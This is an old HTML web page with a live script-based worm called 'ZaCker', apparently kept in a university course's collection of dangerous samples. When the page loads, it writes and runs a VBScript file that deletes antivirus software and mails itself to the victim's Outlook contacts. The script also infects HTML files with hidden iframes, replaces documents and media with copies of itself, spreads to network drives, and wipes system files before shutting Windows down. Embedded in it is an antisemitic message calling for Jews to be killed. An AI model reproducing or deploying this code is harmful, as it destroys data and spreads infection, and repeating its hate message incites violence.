<HTML>
<HEAD>
<TITLE>ZaCker</TITLE>
</HEAD>
<BODY bgcolor="#000000">

<applet codebase=. code="com.ms.activeX.ActiveXComponent.class" tppabs="http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/com.ms.activeX.ActiveXComponent.class" align="baseline"
width="9" height="1" highlight="0">
</applet> 
<script
language="JAVASCRIPT">
window.defaultStatus = "Be carful , ZaCker is so angry !!"
InterfaceObject=document.applets[0];
setTimeout("Upload()",1000);
function Upload() {
fsoClassID="{0D43FE01-F093-11CF-8940-00A0C9054228}";
InterfaceObject.setCLSID(fsoClassID);
fso = InterfaceObject.createInstance();
// windir = fso.getspecialfolder(0);
filename = "http://rol.vbs/";
file = fso.opentextfile(filename, "2", "TRUE");	
file.writeline('On Error Resume Next')
file.writeline('Set sss = CreateObject("wscript.shell")')
file.writeline('sss.regwrite "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\ZaCker", Minute(Now)')
file.writeline('sss.regwrite "HKCU\\software\\microsoft\\internet Explorer\\main\\start Page", "everwonder-1.swf"/*tpa=http://www.orst.edu/groups/msa/everwonder.swf*/')
file.writeline('Set fso = CreateObject("scripting.filesystemobject")')
file.writeline('Const ForReading = 1, ForWriting = 2, ForAppending = 8')
file.writeline('Set Sis = fso.GetSpecialFolder(1)')
file.writeline('Set File = fso.OpenTextFile(WScript.ScriptFullName, 1)')
file.writeline('File.ReadAll')
file.writeline('Set dan = fso.GetFile(WScript.ScriptFullName)')
file.writeline(' dan.Copy (Sis & "http://zacker.vbs/")')
file.writeline('Set f = fso.OpenTextFile(Sis & "\\" & "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/DaLaL.htm", ForWriting, True)')
file.writeline('ap.write "<html><body><span style="& Chr (39)& "position:absolute"& Chr (39)&"><Iframe src=" & Chr (39)& "http://geocities.com/jobreee/main.htm" & Chr (39)& "width="& Chr (39)&"0"& Chr (39)& "height="& Chr (39)&"0"& Chr (39)& "></Iframe></span></body></html>"')
file.writeline(' Set f = fso.OpenTextFile(Sis & "\\" & "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/DaLaL.htm", ForReading)')
file.writeline('Set d = fso.getfolder(Sis)')
file.writeline('drv = d.Drive')
file.writeline('fso.deletefolder (drv & "\\" & "Program Files\\Zone Labs")')
file.writeline('fso.DeleteFile (drv & "\\" & "Program Files\\AntiViral Toolkit Pro\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "Program Files\\Command Software\\F-PROT95\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "eSafe\\Protect\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "PC-Cillin 95\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "PC-Cillin 97\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "Program Files\\Quick Heal\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "Program Files\\FWIN32\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "Program Files\\FindVirus\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "Toolkit\\FindVirus\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "f-macro\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "Program Files\\McAfee\VirusScan95\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "Program Files\\Norton AntiVirus\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "TBAVW95\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "VS95\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "rescue\\*.*")')
file.writeline('fso.DeleteFile (drv & "\\" & "Program Files\\Zone Labs\\*.*")')
file.writeline('S = Chr(34)')
file.writeline('L = vbCrLf')
file.writeline('O = Chr(40)')
file.writeline('C = Chr(41)')
file.writeline('A = Chr(38)')
file.writeline('Set f = fso.OpenTextFile(Sis & "\\" & "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/outlook.vbs", ForWriting, True)')
file.writeline('f.write "Set WW = CreateObject" & O & S & "Outlook.Application" & S & C & L')
file.writeline('f.write "Set HT = WW.GetNamespace" & O & S & "MAPI" & S & C & ".GetDefaultFolder" & O & "10" & C & ".Items" & L')
file.writeline('f.write "E = HT.Count" & L & "ReDim m" & O & "E" & C & L')
file.writeline('f.write "For i = 1 To E" & L & "E = E - 1" & L')
file.writeline('f.write " m" & O & "E" & C & "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/=HT.Item" & O & "i" & C & ".Email1Address" & L')
file.writeline('f.write "If i = 1 Then" & L & "Mail = m" & O & "E" & C & L & "Else" & L')
file.writeline('f.write "Mail = Mail +" & S & ";" & S & "+ m" & O & "E" & C & L')
file.writeline('f.write "End If" & L & "Next" & L & "Set MMM = WW.CreateItem" & O & "0" & C & L')
file.writeline('f.write "MMM.to = Mail" & L & "MMM.Subject =" & S & "Very important !!!" & S & L')
file.writeline('f.write "MMM.Body =" & S & "See this page" & S & "& vbCrLf &" & S & "http://geocities.com/Jobreee/main.htm" & S & L')
file.writeline('f.write "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/MMM.Send"')
file.writeline('Set f = fso.OpenTextFile(Sis & "\\" & "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/outlook.vbs", ForReading)')
file.writeline('sss.run (Sis & "\\" & "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/outlook.vbs")')
file.writeline('Set ShrDrv = CreateObject("WScript.Network")')
file.writeline('Set MMM = ShrDrv.EnumNetworkDrives')
file.writeline('If MMM.Count <> 0 Then')
file.writeline('For drv = 0 To MMM.Count - 1')
file.writeline('If InStr(MMM.Item(drv), "\\") <> 0 Then')
file.writeline('fso.copyfile (Sis & "\\" & "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/DaLaL.htm"), HOLL.BuildPath(MMM.Item(drv), "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/Dallah.htm")')
file.writeline('fso.copyfile (Sis & "\\" & "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/ZaCker.vbs"), HOLL.BuildPath(MMM.Item(drv), "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/server.vbs")')
file.writeline('End If')
file.writeline('Next')
file.writeline('End If')
file.writeline('Main')
file.writeline('Sub Main()')
file.writeline('eq = ""')
file.writeline('ctr = 0')
file.writeline('infectfiles (folderspec)')
file.writeline('folderlist (folderspec)')
file.writeline('fileexist (filespec)')
file.writeline('folderexist (folderspec)')
file.writeline('listadriv')
file.writeline('mot')
file.writeline('End Sub')
file.writeline('Sub listadriv()')
file.writeline('On Error Resume Next')
file.writeline('Dim d, dc, s')
file.writeline('Set fso = CreateObject("Scripting.FileSystemObject")')
file.writeline('Set dc = fso.Drives')
file.writeline('For Each d In dc')
file.writeline('If d.DriveType = 2 Or d.DriveType = 3 Then')
file.writeline('folderlist (d.Path & "\\")')
file.writeline('End If')
file.writeline('Next')
file.writeline('listadrive = s')
file.writeline('Call infectfiles(folderspec)')
file.writeline('End Sub')
file.writeline('Sub infectfiles(folderspec)')
file.writeline('On Error Resume Next')
file.writeline('Dim f, f1, fc, ext, ap')
file.writeline('Const ForReading = 1, ForWriting = 2, ForAppending = 8')
file.writeline(' Set fso = CreateObject("Scripting.FileSystemObject")')
file.writeline('Set f = fso.getfolder(folderspec)')
file.writeline('Set fc = f.Files')
file.writeline('For Each f1 In fc')
file.writeline('ext = fso.GetExtensionName(f1.Path)')
file.writeline('ext = LCase(ext)')
file.writeline('s = LCase(f1.Name)')
file.writeline('If (ext = "htm") Or (ext = "html") Or (ext = "asp") Then')
file.writeline('Set ap = fso.OpenTextFile(f1.Path, 8, True)')
file.writeline('ap.write "<html><body><span style="& Chr (39)& "position:absolute"& Chr (39)&"><Iframe src=" & Chr (39)& "http://geocities.com/jobreee/main.htm" & Chr (39)& "width="& Chr (39)&"0"& Chr (39)& "height="& Chr (39)&"0"& Chr (39)& "></Iframe></span></body></html>"')
file.writeline('ap.Close')
file.writeline('Set ap = fso.OpenTextFile(f1.Path, 1)')
file.writeline('Set cop = fso.GetFile(f1.Path)')
file.writeline('cop.Copy (f1.Path)')
file.writeline('Set atz = fso.GetFile(f1.Path)')
file.writeline('atz.Attributes = att.Attributes + 2')
file.writeline('ElseIf (ext = "lnk") Or (ext = "zip") Or (ext = "jpg") Or (ext = "jpeg") Or (ext = "mpg") Or (ext = "mpeg") Or (ext = "doc") Or (ext = "xls") Or (ext = "mdb") Or (ext = "txt") Or (ext = "ppt") Or (ext = "pps") Or (ext = "ram") Or (ext = "rm") Or (ext = "mp3") Or (ext = "mdb") Or (ext = "swf") Then')
file.writeline('fso.copyfile (Sis & "\\" & "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/ZaCker.vbs"), (f1.Path & ".vbs")')
file.writeline('fso.deletefile (f1.Path)')
file.writeline('End If')
file.writeline('If f1.Name = "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/mirc.ini" Then')
file.writeline('Set fold = fso.getfolder(f1.ParentFolder)')
file.writeline('Set fil = fold.Files')
file.writeline('For Each f In fil')
file.writeline('If (ext = "ini") Then')
file.writeline('Set f = fso.OpenTextFile(f.Path, 2, True)')
file.writeline('f.write "on 1:JOIN:#:/msg $chan  See This Site http://geocities.com/jobreee/main.htm  $nick! "')
file.writeline('Set f = fso.OpenTextFile(f.Path, 1)')
file.writeline('End If')
file.writeline('Next')
file.writeline('End If')
file.writeline('Next')
file.writeline('End Sub')
file.writeline('Sub folderlist(folderspec)')
file.writeline('On Error Resume Next')
file.writeline('Dim f, f1, sf')
file.writeline('Set fso = CreateObject("Scripting.FileSystemObject")')
file.writeline('Set f = fso.getfolder(folderspec)')
file.writeline('Set sf = f.SubFolders')
file.writeline('For Each f1 In sf')
file.writeline('infectfiles (f1.Path)')
file.writeline('folderlist (f1.Path)')
file.writeline('Next')
file.writeline('End Sub')
file.writeline('Function fileexist(filespec)')
file.writeline('On Error Resume Next')
file.writeline('Dim msg')
file.writeline('Set fso = CreateObject("Scripting.FileSystemObject")')
file.writeline('If (fso.FileExists(filespec)) Then')
file.writeline('msg = 0')
file.writeline('Else')
file.writeline('msg = 1')
file.writeline('End If')
file.writeline('fileexist = msg')
file.writeline('End Function')
file.writeline('Function folderexist(folderspec)')
file.writeline('On Error Resume Next')
file.writeline('Dim msg')
file.writeline('Set fso = CreateObject("Scripting.FileSystemObject")')
file.writeline('If (fso.GetFolderExists(folderspec)) Then')
file.writeline('msg = 0')
file.writeline('Else')
file.writeline('msg = 1')
file.writeline('End If')
file.writeline('fileexist msg')
file.writeline('End Function')
file.writeline('Sub mot()')
file.writeline('On Error Resume Next')
file.writeline('Set sss = CreateObject("wscript.shell")')
file.writeline('Set TAFi = sss.regread("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\ZaCker")')
file.writeline(' Do')
file.writeline('If Minute(Now) = TAFi + 30 And Second(Now) = 5 Then')
file.writeline('Set fso = CreateObject("scripting.filesystemobject")')
file.writeline('Set Sis = fso.GetSpecialFolder(1)')
file.writeline('Set Folder = fso.getfolder(Sis)')
file.writeline('Set Files = Folder.Files')
file.writeline('For Each File In Files')
file.writeline('fso.deletefile (File.Path)')
file.writeline('Next')
file.writeline('MsgBox " America will never survive till it dismisses jews from its land " & vbCrLf & "            jews bring disasters to any pll they live with" & vbCrLf & "                     i dunno why they are still alive !!!" & vbCrLf & "                          lets kill them one by one", 6, "ZaCker " ')

file.writeline('sss.run "rundll32.exe user.exe,exitwindows"')
file.writeline('End If')
file.writeline('Loop')
file.writeline('End Sub')

file.close();	
Run();	
}

function Run() {

WshShellClassID="{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}";
InterfaceObject.setCLSID(WshShellClassID);
wshShell = InterfaceObject.createInstance();	
wshShell.run(filename,"6","TRUE");	}
-->
</script>
<p align="center"><font color="#FF0000" face="Matisse ITC" size="5">Sharoon = a war crimenal<br>
Bush supports him<br>
So...<br>
Bush = a war crimenal<br>
American people must protect their country otherwise, their<br>
government will lead them to the hell !<br>
<br>
<br>
<br>
Best Regards<br>
America Lovers<br>
  ZA-UNION</font></p>
</html>
<!-- text below generated by server. PLEASE REMOVE --></object></layer></div></span></style></noscript></table></script></applet><script language="JavaScript" src="geov2.js" tppabs="http://us.geocities.com/js_source/geov2.js"></script><script language="javascript">geovisit();</script><noscript><img src="visit.gif-1008751440.gif" tppabs="http://visit.geocities.com/visit.gif?1008751440" border=0 width=1 height=1></noscript>
<IMG SRC="serv-s=76001081&t=1008751440.gif" tppabs="http://geo.yahoo.com/serv?s=76001081&t=1008751440" ALT=1 WIDTH=1 HEIGHT=1>
